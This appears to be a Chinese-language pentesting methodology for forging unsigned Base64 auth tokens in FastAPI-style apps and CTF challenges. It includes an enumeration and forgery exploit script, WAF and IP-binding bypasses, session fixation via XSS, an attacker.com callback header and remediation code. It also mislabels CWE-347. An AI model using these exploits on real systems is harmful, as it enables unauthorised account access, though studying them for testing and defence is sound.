# Base64 令牌伪造攻击方法论

**文档版本：** 1.0  
**创建日期：** 2026 年 3 月 15 日  
**适用技能：** authentication-failures, broken-access-control

---

# 第一部分：文档概述

## 1.1 编写目的

本文档为渗透测试人员提供一套标准化、可复现的 Base64 令牌伪造攻击方法，用于检测和利用认证系统中使用非加密签名令牌的安全缺陷。通过本方法论，测试人员可以快速识别令牌生成机制、分析令牌结构、伪造有效令牌，最终实现认证绕过和未授权访问。

## 1.2 适用范围

本文档适用于以下场景：
- **Web 应用认证系统**：使用自定义令牌机制进行身份验证的应用
- **API 服务**：通过 Cookie 或 Header 传递认证令牌的 RESTful API
- **FastAPI/Flask/Django 应用**：Python Web 框架实现的认证系统
- **CTF 挑战应用**：设计用于安全培训的漏洞应用
- **遗留系统**：未采用标准 JWT/OAuth2 的自定义认证实现

**典型漏洞特征：**
- 令牌仅使用 Base64 编码，无 HMAC 签名
- 令牌结构可预测（如仅包含用户 ID）
- 令牌无过期时间或过期时间未验证
- 服务端无会话状态管理

## 1.3 读者对象

- 渗透测试工程师
- 安全评估人员
- 代码审计工程师
- CTF 参赛选手
- 应用安全开发人员（用于理解攻击原理以改进防御）

---

# 第二部分：核心渗透技术专题

## 专题一：Base64 令牌伪造攻击

### 2.1 技术介绍

**漏洞原理：**

Base64 令牌伪造漏洞是指应用程序使用简单的 Base64 编码生成认证令牌，而非使用加密签名（如 JWT 的 HMAC-SHA256）。由于 Base64 仅是一种可逆编码而非加密算法，攻击者可以：
1. 解码任意令牌查看其结构
2. 修改令牌内容（如更改用户 ID）
3. 重新编码生成"有效"令牌
4. 使用伪造令牌绕过认证

**本质问题：**
- **数据与签名未分离**：令牌内容未经过加密签名保护
- **完整性缺失**：无法检测令牌是否被篡改
- **可预测性**：令牌生成算法公开且确定性

**技术对比：**

| 特性 | Base64 令牌 | JWT（正确实现） |
|------|-------------|-----------------|
| 编码方式 | Base64 | Base64 + HMAC 签名 |
| 完整性保护 | ❌ 无 | ✅ 有签名验证 |
| 防篡改 | ❌ 可任意修改 | ✅ 修改后签名失效 |
| 安全性 | ❌ 仅编码 | ✅ 加密签名 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|----------|----------|------------|
| **自定义认证系统** | 登录/注册功能 | 开发者自行实现令牌生成，未使用标准库 |
| **会话管理** | Cookie 存储会话 ID | 会话 ID 仅 Base64 编码用户标识 |
| **API 认证** | Bearer Token 认证 | Token 无签名验证机制 |
| **快速原型开发** | CTF 挑战/演示系统 | 为简化实现跳过签名步骤 |
| **遗留系统迁移** | 老系统升级 | 保留旧令牌格式未更新安全机制 |
| **FastAPI/Flask 应用** | Python Web 应用 | 导入 JWT 库但未正确使用 |

**高危信号：**
- 代码中导入 `jose.jwt` 或 `PyJWT` 但实际使用 `base64.b64encode()`
- 定义了 `SECRET_KEY` 但从未在令牌生成中使用
- 令牌长度短且格式固定（如 `MQ==`, `Mg==`, `Mw==`）

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤 1：获取初始令牌**

方法 A - 合法登录：
```bash
# 使用默认凭证或已知凭证登录
curl -X POST http://target/token \
  -d "username=demo&password=demo" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt

# 从响应中提取令牌
grep access_token cookies.txt
# 输出示例：access_token    Bearer MQ==
```

方法 B - 拦截现有会话：
```bash
# 使用浏览器开发者工具
# Network 标签 → 查看请求 Cookie → 复制 access_token 值
```

**步骤 2：分析令牌结构**

```bash
# 移除 "Bearer " 前缀并解码
echo "MQ==" | base64 -d
# 输出：1

# 尝试多个令牌寻找规律
echo "Mg==" | base64 -d  # 输出：2
echo "Mw==" | base64 -d  # 输出：3
```

**规律识别：**
- 如果解码结果是**纯数字** → 可能是用户 ID
- 如果解码结果是**用户名/邮箱** → 可能是用户标识符
- 如果解码结果是**JSON 格式** → 可能是未签名的 JWT
- 如果解码结果是**随机字符串** → 可能是安全会话 ID（非本漏洞）

**步骤 3：初步验证**

```bash
# 假设解码结果是用户 ID，尝试伪造 ID=2 的令牌
python3 -c "import base64; print(base64.b64encode(b'2').decode())"
# 输出：Mg==

# 使用伪造令牌访问目标资源
curl http://target/company/2/jobs \
  -H "Cookie: access_token=Bearer Mg=="
```

**成功标志：**
- 返回 HTTP 200 状态码
- 响应包含目标用户的数据
- 无签名验证错误

#### 2.3.2 白盒测试

**代码审计检查点：**

1. **搜索令牌生成函数**
```bash
# 搜索 Base64 编码使用
grep -rn "base64.b64encode" /path/to/code
grep -rn "base64_encode" /path/to/code

# 搜索 JWT 库导入但未使用
grep -rn "import.*jwt" /path/to/code
grep -rn "from jose import" /path/to/code
```

2. **检查令牌生成逻辑**
```python
# 漏洞代码示例（/app/main.py:40-41）
def create_access_token(data: str):
    return base64.b64encode(data.encode()).decode()
    # ❌ 无签名、无过期时间、无密钥
```

3. **检查令牌验证逻辑**
```python
# 漏洞代码示例（/app/main.py:131-149）
async def validate_token(company_id, request):
    token = request.cookies.get("access_token")
    token_company_id = int(base64.b64decode(token.split(" ")[1]).decode())
    if token_company_id != company_id:
        raise credentials_exception
    # ❌ 仅检查格式和匹配，无签名验证
```

4. **识别未使用的安全配置**
```python
# 定义了但未使用的安全配置
SECRET_KEY = "a very secret key"  # ❌ 未使用
ALGORITHM = "HS256"              # ❌ 未使用
ACCESS_TOKEN_EXPIRE_MINUTES = 30 # ❌ 未使用
```

### 2.4 漏洞利用方法

#### 2.4.1 基础令牌伪造

**场景 1：已知目标用户 ID**

```bash
# 目标：访问用户 ID=2 的资源
# 步骤 1：生成令牌
TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'2').decode())")
# 输出：Mg==

# 步骤 2：使用令牌访问
curl http://target/company/2/jobs \
  -H "Cookie: access_token=Bearer $TOKEN"
```

**场景 2：枚举所有用户**

```bash
# 批量生成令牌并测试
for i in {1..10}; do
    TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'$i').decode())")
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        http://target/company/$i/jobs \
        -H "Cookie: access_token=Bearer $TOKEN")
    echo "User $i: HTTP $RESPONSE"
done
```

**场景 3：访问管理员账户**

```bash
# 假设管理员 ID=2（常见模式）
ADMIN_TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'2').decode())")

# 访问管理员专属资源
curl http://target/admin/dashboard \
  -H "Cookie: access_token=Bearer $ADMIN_TOKEN"

# 或访问私有数据（如 CTF Flag）
curl http://target/company/2/jobs \
  -H "Cookie: access_token=Bearer $ADMIN_TOKEN"
```

#### 2.4.2 高级利用技术

**技术 1：令牌持久化访问**

```bash
# 由于令牌永不过期，可长期保存使用
# 创建持久化 Cookie 文件
echo 'target.com	TRUE	/	FALSE	0	access_token	Bearer Mg==' > cookies.txt

# 后续请求直接使用
curl http://target/protected/resource -b cookies.txt
```

**技术 2：会话固定攻击**

```bash
# 预计算目标用户令牌
VICTIM_ID=3
VICTIM_TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'$VICTIM_ID').decode())")

# 诱导受害者使用已知令牌（如通过 XSS 设置 Cookie）
# 然后使用该令牌访问受害者账户
curl http://target/account/profile \
  -H "Cookie: access_token=Bearer $VICTIM_TOKEN"
```

**技术 3：权限提升链**

```bash
# 步骤 1：以普通用户身份登录
curl -X POST http://target/token -d "username=demo&password=demo" -c cookies.txt

# 步骤 2：提取当前用户 ID（假设为 1）
# 步骤 3：伪造管理员令牌（假设管理员 ID=2）
ADMIN_TOKEN=$(python3 -c "import base64; print(base64.b64encode(b'2').decode())")

# 步骤 4：使用管理员令牌访问敏感数据
curl http://target/admin/flags \
  -H "Cookie: access_token=Bearer $ADMIN_TOKEN"
```

#### 2.4.3 自动化利用脚本

```python
#!/usr/bin/env python3
"""
Base64 Token Forgery Exploit
针对应用的自动化利用工具
"""

import base64
import requests
import sys

BASE_URL = "http://localhost:38803"

def forge_token(user_id: str) -> str:
    """伪造指定用户 ID 的令牌"""
    return base64.b64encode(user_id.encode()).decode()

def test_token(user_id: str, token: str) -> bool:
    """测试令牌是否有效"""
    url = f"{BASE_URL}/company/{user_id}/jobs"
    cookies = {"access_token": f"Bearer {token}"}
    
    try:
        response = requests.get(url, cookies=cookies, allow_redirects=False)
        return response.status_code == 200
    except requests.RequestException:
        return False

def enumerate_users(max_id: int = 100):
    """枚举所有用户"""
    print(f"[*] Enumerating users from ID 1 to {max_id}...")
    
    for user_id in range(1, max_id + 1):
        token = forge_token(str(user_id))
        if test_token(str(user_id), token):
            print(f"[+] User {user_id} found! Token: Bearer {token}")
            
            # 尝试访问敏感数据
            url = f"{BASE_URL}/company/{user_id}/jobs"
            response = requests.get(url, cookies={"access_token": f"Bearer {token}"})
            
            if "flag{" in response.text.lower():
                print(f"[***] FLAG FOUND for user {user_id}!")
                for line in response.text.split('\n'):
                    if 'flag{' in line.lower():
                        print(f"    {line.strip()}")

def main():
    if len(sys.argv) > 1:
        target_id = sys.argv[1]
        token = forge_token(target_id)
        print(f"[*] Forged token for user {target_id}: Bearer {token}")
        
        if test_token(target_id, token):
            print(f"[+] Token is valid! Accessing resources...")
            # 访问资源逻辑...
        else:
            print(f"[-] Token validation failed")
    else:
        enumerate_users()

if __name__ == "__main__":
    main()
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过令牌前缀检查

**场景：** 服务端检查 `Bearer ` 前缀

```bash
# 正常格式
curl -H "Cookie: access_token=Bearer MQ=="

# 如果过滤 "Bearer"，尝试变体
curl -H "Cookie: access_token=bearer MQ=="   # 小写
curl -H "Cookie: access_token=BEARER MQ=="   # 大写
curl -H "Cookie: access_token=Bearer  MQ=="  # 双空格
```

#### 2.5.2 绕过 Cookie 名称过滤

**场景：** WAF 过滤 `access_token` Cookie

```bash
# 尝试常见变体
curl -H "Cookie: accessToken=MQ=="
curl -H "Cookie: session=MQ=="
curl -H "Cookie: token=MQ=="
curl -H "Cookie: auth_token=MQ=="
curl -H "Cookie: jwt=MQ=="
```

#### 2.5.3 绕过 IP 绑定检查

**场景：** 令牌与 IP 地址绑定

```bash
# 方法 1：通过 SSRF 绕过（如果应用有 SSRF 漏洞）
curl http://target/ssrf-endpoint \
  -d "url=http://internal-api/protected" \
  -H "X-Forwarded-For: 127.0.0.1"

# 方法 2：使用应用内部请求（如通过命令注入）
python3 -c """
import requests
requests.get('http://localhost:8000/protected',
    cookies={'access_token': 'Bearer Mg=='})
"""
```

#### 2.5.4 无回显利用

**场景：** 令牌验证成功但页面无明显变化

```bash
# 使用时间差检测
time curl http://target/protected \
  -H "Cookie: access_token=Bearer INVALID_TOKEN"
# vs
time curl http://target/protected \
  -H "Cookie: access_token=Bearer VALID_TOKEN"

# 使用外带检测（如果有 SSRF 或命令执行）
curl http://target/protected \
  -H "Cookie: access_token=Bearer Mg==" \
  -H "X-Callback: http://attacker.com/webhook"
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 目标用户 ID | Base64 令牌 | 完整 Cookie 值 |
|-------------|-------------|----------------|
| 1 | MQ== | Bearer MQ== |
| 2 | Mg== | Bearer Mg== |
| 3 | Mw== | Bearer Mw== |
| 4 | NA== | Bearer NA== |
| 5 | NQ== | Bearer NQ== |
| 10 | MTA= | Bearer MTA= |
| 100 | MTAw | Bearer MTAw |
| admin | YWRtaW4= | Bearer YWRtaW4= |
| root | cm9vdA== | Bearer cm9vdA== |

**快速生成命令：**
```bash
# Linux/Mac
echo -n "USER_ID" | base64

# Python
python3 -c "import base64; print(base64.b64encode(b'USER_ID').decode())"

# 在线工具
# https://www.base64encode.org/
```

## 3.2 常见漏洞代码模式

### 模式 1：纯 Base64 编码（无签名）
```python
# ❌ 漏洞代码
import base64

def create_token(user_id):
    return base64.b64encode(str(user_id).encode()).decode()
```

### 模式 2：定义了 SECRET_KEY 但未使用
```python
# ❌ 漏洞代码
SECRET_KEY = "secret"
ALGORITHM = "HS256"

def create_token(user_id):
    # 导入了 JWT 库但不用
    return base64.b64encode(str(user_id).encode()).decode()
```

### 模式 3：令牌验证无签名检查
```python
# ❌ 漏洞代码
def verify_token(token):
    try:
        # 仅解码，无签名验证
        user_id = base64.b64decode(token).decode()
        return int(user_id)
    except:
        return None
```

### 模式 4：正确实现（对比参考）
```python
# ✅ 安全代码
from jose import jwt
import datetime

SECRET_KEY = "your-secret-key"
ALGORITHM = "HS256"

def create_token(user_id: str):
    expire = datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    to_encode = {
        "sub": user_id,
        "exp": expire
    }
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str):
    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    return payload["sub"]
```

## 3.3 检测工具推荐

| 工具名称 | 用途 | 使用示例 |
|----------|------|----------|
| **Burp Suite** | 拦截/修改令牌 | Decoder 标签页 → Base64 解码 |
| **jwt.io** | 分析令牌结构 | 粘贴令牌查看内容（仅参考） |
| **CyberChef** | 编码/解码 | Base64 Decode 操作 |
| **sqlmap** | 检测注入（配合使用） | `--cookie="access_token=Bearer *"` |
| **自定义脚本** | 批量枚举 | 参考 2.4.3 节脚本 |

## 3.4 相关 CWE 和 OWASP

- **CWE-287**: 不当认证（Improper Authentication）
- **CWE-306**: 关键功能缺少认证（Missing Authentication for Critical Function）
- **CWE-347**: 令牌验证不当（Improper Verification of Cryptographic Strength）
- **OWASP Top 10:2025 A07**: 认证失效（Authentication Failures）
- **OWASP Top 10:2025 A01**: 访问控制失效（Broken Access Control）

## 3.5 修复建议

**给开发人员的修复指南：**

1. **使用标准 JWT 库**
```python
from jose import jwt
import datetime

SECRET_KEY = os.environ.get("SECRET_KEY")  # 从环境变量读取
ALGORITHM = "HS256"

def create_access_token(data: str):
    expire = datetime.datetime.utcnow() + datetime.timedelta(
        minutes=ACCESS_TOKEN_EXPIRE_MINUTES
    )
    to_encode = {"sub": data, "exp": expire}
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
```

2. **验证令牌签名**
```python
from jose import jwt, JWTError

async def validate_token(company_id, request):
    token = request.cookies.get("access_token")
    try:
        # 移除 "Bearer " 前缀
        token = token.split(" ")[1] if " " in token else token
        
        # 验证签名和过期时间
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        token_company_id = int(payload["sub"])
        
        if token_company_id != company_id:
            raise credentials_exception
            
    except JWTError:
        raise credentials_exception
```

3. **添加令牌过期时间**
```python
ACCESS_TOKEN_EXPIRE_MINUTES = 30  # 必须实际使用

def create_access_token(data: str):
    expire = datetime.datetime.utcnow() + datetime.timedelta(
        minutes=ACCESS_TOKEN_EXPIRE_MINUTES
    )
    to_encode = {"sub": data, "exp": expire}
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
```

4. **实现登出功能**
```python
@app.post("/logout")
async def logout(response: Response):
    response.delete_cookie("access_token")
    return {"message": "Logged out successfully"}
```
